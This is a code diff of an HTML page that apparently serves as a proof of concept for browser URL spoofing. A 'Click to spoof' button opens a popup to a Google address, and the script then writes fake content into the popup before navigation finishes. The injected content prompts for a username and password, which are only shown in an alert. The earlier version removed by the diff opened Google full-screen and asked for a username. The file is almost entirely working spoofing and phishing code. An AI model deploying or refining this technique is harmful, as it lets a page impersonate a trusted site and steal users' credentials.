@@ -1,45 +1,31 @@
+
+<!DOCTYPE html>
 <html>
- <head> 
-  <meta charset="utf-8">
-<style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-</style>
- </head> 
- <body> 
-  <script>
-function a(){
-  const w = screen.availWidth;
-  const h = screen.availHeight;
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
 
-    window.open(
-      "https://google.com",
-      "popup",
-      `
-  width=${screen.availWidth},
-  height=${screen.availHeight},
-  left=0,
-  top=0,
-  resizable=yes,
-  scrollbars=yes
-  `);
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com/csi", "_blank", "popup");
 
-    setTimeout(() => {
-    const ok = prompt("username");
-    if (ok) window.location.href = "https://example.com/next-page";
-  }, 3000);
-}
-</script> 
-  <center><input type="button" class="button" value="Go to Google.com" onclick="a()"> </center>
- </body>
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
 </html>
